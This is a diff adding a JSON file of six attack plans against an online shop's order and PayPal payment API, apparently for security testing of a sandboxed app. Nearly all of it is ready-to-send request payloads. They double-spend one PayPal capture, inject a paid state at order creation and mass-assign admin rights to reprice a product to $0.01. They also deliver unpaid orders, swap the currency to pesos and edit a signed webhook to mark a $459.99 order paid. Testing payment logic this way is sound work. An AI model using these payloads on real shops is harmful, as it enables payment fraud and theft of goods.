@@ -1,0 +1,404 @@
+{
+  "plans": [
+    {
+      "name": "Double-spend one capture on two shop orders",
+      "idea": "The pay endpoint may validate a capture only by amount/status, not by whether that PayPal transaction was already used for a different shop order.",
+      "expect": "The purchase from the buy step and a second separately created shop order are both marked paid, yielding two parcels for one $459.99 capture.",
+      "steps": [
+        {
+          "do": "buy",
+          "tamper": {},
+          "blockCapture": false,
+          "save": "b"
+        },
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/orders",
+          "body": {
+            "orderItems": [
+              {
+                "_id": "6af06edf5a27e3b99341f125",
+                "user": "6af06edf5a27e3b99341f11d",
+                "name": "Sony Playstation 5",
+                "image": "/images/playstation.jpg",
+                "brand": "Sony",
+                "category": "Electronics",
+                "description": "The ultimate home entertainment center starts with PlayStation. Whether you are into gaming, HD movies, television, music",
+                "rating": 5,
+                "numReviews": 12,
+                "price": 399.99,
+                "countInStock": 11,
+                "reviews": [],
+                "__v": 0,
+                "createdAt": "2026-11-08T12:45:19.741Z",
+                "updatedAt": "2026-11-08T12:45:19.741Z",
+                "qty": 1
+              }
+            ],
+            "shippingAddress": {
+              "address": "2211 N First St",
+              "city": "San Jose",
+              "postalCode": "95131",
+              "country": "United States"
+            },
+            "paymentMethod": "PayPal",
+            "itemsPrice": "399.99",
+            "shippingPrice": "0.00",
+            "taxPrice": "60.00",
+            "totalPrice": "459.99"
+          },
+          "headers": {},
+          "times": 1,
+          "together": false,
+          "save": "a"
+        },
+        {
+          "do": "request",
+          "method": "PUT",
+          "path": "/api/orders/{{a.body._id}}/pay",
+          "body": {
+            "id": "{{b.paypalOrderId}}",
+            "intent": "CAPTURE",
+            "status": "COMPLETED",
+            "update_time": "2026-11-08T12:45:53Z",
+            "payer": {
+              "email_address": "sandbox-buyer@personal.example.com",
+              "name": {
+                "given_name": "John",
+                "surname": "Doe"
+              }
+            },
+            "purchase_units": [
+              {
+                "reference_id": "default",
+                "amount": {
+                  "currency_code": "USD",
+                  "value": "{{legit.bagTotal}}"
+                },
+                "payments": {
+                  "captures": [
+                    {
+                      "id": "{{b.captureId}}",
+                      "status": "COMPLETED",
+                      "amount": {
+                        "currency_code": "USD",
+                        "value": "{{legit.bagTotal}}"
+                      },
+                      "final_capture": true
+                    }
+                  ]
+                }
+              }
+            ]
+          },
+          "headers": {},
+          "times": 1,
+          "together": false,
+          "save": "c"
+        }
+      ]
+    },
+    {
+      "name": "Inject paid state at order creation",
+      "idea": "Order creation may accept client-supplied payment-state fields instead of always initializing isPaid to false on the server.",
+      "expect": "A newly created order is immediately returned and stored as paid, without any new PayPal capture.",
+      "steps": [
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/orders",
+          "body": {
+            "orderItems": [
+              {
+                "_id": "6af06edf5a27e3b99341f125",
+                "user": "6af06edf5a27e3b99341f11d",
+                "name": "Sony Playstation 5",
+                "image": "/images/playstation.jpg",
+                "brand": "Sony",
+                "category": "Electronics",
+                "description": "The ultimate home entertainment center starts with PlayStation. Whether you are into gaming, HD movies, television, music",
+                "rating": 5,
+                "numReviews": 12,
+                "price": 399.99,
+                "countInStock": 11,
+                "reviews": [],
+                "__v": 0,
+                "createdAt": "2026-11-08T12:45:19.741Z",
+                "updatedAt": "2026-11-08T12:45:19.741Z",
+                "qty": 1
+              }
+            ],
+            "shippingAddress": {
+              "address": "2211 N First St",
+              "city": "San Jose",
+              "postalCode": "95131",
+              "country": "United States"
+            },
+            "paymentMethod": "PayPal",
+            "itemsPrice": "399.99",
+            "shippingPrice": "0.00",
+            "taxPrice": "60.00",
+            "totalPrice": "459.99",
+            "isPaid": true,
+            "paidAt": "2026-11-08T12:45:54.010Z",
+            "isDelivered": false,
+            "paymentResult": {
+              "id": "{{legit.paypalOrderId}}",
+              "status": "COMPLETED",
+              "update_time": "2026-11-08T12:45:53Z",
+              "email_address": "sandbox-buyer@personal.example.com"
+            }
+          },
+          "headers": {},
+          "times": 1,
+          "together": false,
+          "save": "a"
+        },
+        {
+          "do": "request",
+          "method": "GET",
+          "path": "/api/orders/{{a.body._id}}",
+          "body": {},
+          "headers": {},
+          "times": 1,
+          "together": false,
+          "save": "c"
+        }
+      ]
+    },
+    {
+      "name": "Become admin and reprice the product",
+      "idea": "The profile-update endpoint may mass-assign isAdmin; an admin product update would then change the database price that both the shop total and PayPal amount are calculated from.",
+      "expect": "A normal subsequent purchase is charged only $0.01 for the PlayStation plus whatever shipping and tax the shop calculates on that price.",
+      "steps": [
+        {
+          "do": "request",
+          "method": "PUT",
+          "path": "/api/users/profile",
+          "body": {
+            "name": "John Doe",
+            "email": "john@email.com",
+            "isAdmin": true
+          },
+          "headers": {},
+          "times": 1,
+          "together": false,
+          "save": "a"
+        },
+        {
+          "do": "request",
+          "method": "PUT",
+          "path": "/api/products/6af06edf5a27e3b99341f125",
+          "body": {
+            "name": "Sony Playstation 5",
+            "image": "/images/playstation.jpg",
+            "brand": "Sony",
+            "category": "Electronics",
+            "description": "The ultimate home entertainment center starts with PlayStation. Whether you are into gaming, HD movies, television, music",
+            "price": 0.01,
+            "countInStock": 11
+          },
+          "headers": {},
+          "times": 1,
+          "together": false,
+          "save": "c"
+        },
+        {
+          "do": "buy",
+          "tamper": {},
+          "blockCapture": false,
+          "save": "b"
+        }
+      ]
+    },
+    {
+      "name": "Deliver an unpaid order",
+      "idea": "The deliver endpoint may set isDelivered without checking isPaid, and the profile endpoint may provide the admin privilege it requires.",
+      "expect": "An order that was never paid is marked delivered and enters shipment.",
+      "steps": [
+        {
+          "do": "request",
+          "method": "PUT",
+          "path": "/api/users/profile",
+          "body": {
+            "name": "John Doe",
+            "email": "john@email.com",
+            "isAdmin": true
+          },
+          "headers": {},
+          "times": 1,
+          "together": false,
+          "save": "a"
+        },
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/orders",
+          "body": {
+            "orderItems": [
+              {
+                "_id": "6af06edf5a27e3b99341f125",
+                "user": "6af06edf5a27e3b99341f11d",
+                "name": "Sony Playstation 5",
+                "image": "/images/playstation.jpg",
+                "brand": "Sony",
+                "category": "Electronics",
+                "description": "The ultimate home entertainment center starts with PlayStation. Whether you are into gaming, HD movies, television, music",
+                "rating": 5,
+                "numReviews": 12,
+                "price": 399.99,
+                "countInStock": 11,
+                "reviews": [],
+                "__v": 0,
+                "createdAt": "2026-11-08T12:45:19.741Z",
+                "updatedAt": "2026-11-08T12:45:19.741Z",
+                "qty": 1
+              }
+            ],
+            "shippingAddress": {
+              "address": "2211 N First St",
+              "city": "San Jose",
+              "postalCode": "95131",
+              "country": "United States"
+            },
+            "paymentMethod": "PayPal",
+            "itemsPrice": "399.99",
+            "shippingPrice": "0.00",
+            "taxPrice": "60.00",
+            "totalPrice": "459.99"
+          },
+          "headers": {},
+          "times": 1,
+          "together": false,
+          "save": "c"
+        },
+        {
+          "do": "request",
+          "method": "PUT",
+          "path": "/api/orders/{{c.body._id}}/deliver",
+          "body": {},
+          "headers": {},
+          "times": 1,
+          "together": false,
+          "save": "d"
+        },
+        {
+          "do": "request",
+          "method": "GET",
+          "path": "/api/orders/{{c.body._id}}",
+          "body": {},
+          "headers": {},
+          "times": 1,
+          "together": false,
+          "save": "e"
+        }
+      ]
+    },
+    {
+      "name": "Pay the right number in the wrong currency",
+      "idea": "Payment verification may compare only the numeric amount value and ignore currency_code, so 459.99 Philippine pesos may be treated as 459.99 US dollars.",
+      "expect": "The shop marks the $459.99 order paid after a capture worth only about $8.",
+      "steps": [
+        {
+          "do": "buy",
+          "tamper": {
+            "purchase_units": [
+              {
+                "reference_id": "default",
+                "amount": {
+                  "currency_code": "PHP",
+                  "value": "459.99"
+                }
+              }
+            ]
+          },
+          "blockCapture": false,
+          "save": "b"
+        },
+        {
+          "do": "request",
+          "method": "GET",
+          "path": "/api/orders/{{b.shopOrderId}}",
+          "body": {},
+          "headers": {},
+          "times": 1,
+          "together": false,
+          "save": "a"
+        }
+      ]
+    },
+    {
+      "name": "Redirect a real $0.01 webhook to a $459.99 order",
+      "idea": "A webhook handler may trust the edited resource amount and custom_id while retaining the original signature headers, without refetching the capture from PayPal or cryptographically revalidating the edited body.",
+      "expect": "A fresh unpaid $459.99 shop order becomes paid although the referenced real capture was only $0.01.",
+      "steps": [
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/orders",
+          "body": {
+            "orderItems": [
+              {
+                "_id": "6af06edf5a27e3b99341f125",
+                "user": "6af06edf5a27e3b99341f11d",
+                "name": "Sony Playstation 5",
+                "image": "/images/playstation.jpg",
+                "brand": "Sony",
+                "category": "Electronics",
+                "description": "The ultimate home entertainment center starts with PlayStation. Whether you are into gaming, HD movies, television, music",
+                "rating": 5,
+                "numReviews": 12,
+                "price": 399.99,
+                "countInStock": 11,
+                "reviews": [],
+                "__v": 0,
+                "createdAt": "2026-11-08T12:45:19.741Z",
+                "updatedAt": "2026-11-08T12:45:19.741Z",
+                "qty": 1
+              }
+            ],
+            "shippingAddress": {
+              "address": "2211 N First St",
+              "city": "San Jose",
+              "postalCode": "95131",
+              "country": "United States"
+            },
+            "paymentMethod": "PayPal",
+            "itemsPrice": "399.99",
+            "shippingPrice": "0.00",
+            "taxPrice": "60.00",
+            "totalPrice": "459.99"
+          },
+          "headers": {},
+          "times": 1,
+          "together": false,
+          "save": "a"
+        },
+        {
+          "do": "webhook",
+          "event": "PAYMENT.CAPTURE.COMPLETED",
+          "edit": {
+            "resource.amount.value": "459.99",
+            "resource.amount.currency_code": "USD",
+            "resource.custom_id": "{{a.body._id}}",
+            "resource.supplementary_data.related_ids.order_id": "{{legit.paypalOrderId}}",
+            "resource.status": "COMPLETED"
+          },
+          "signed": true,
+          "times": 1
+        },
+        {
+          "do": "request",
+          "method": "GET",
+          "path": "/api/orders/{{a.body._id}}",
+          "body": {},
+          "headers": {},
+          "times": 1,
+          "together": false,
+          "save": "c"
+        }
+      ]
+    }
+  ]
+}
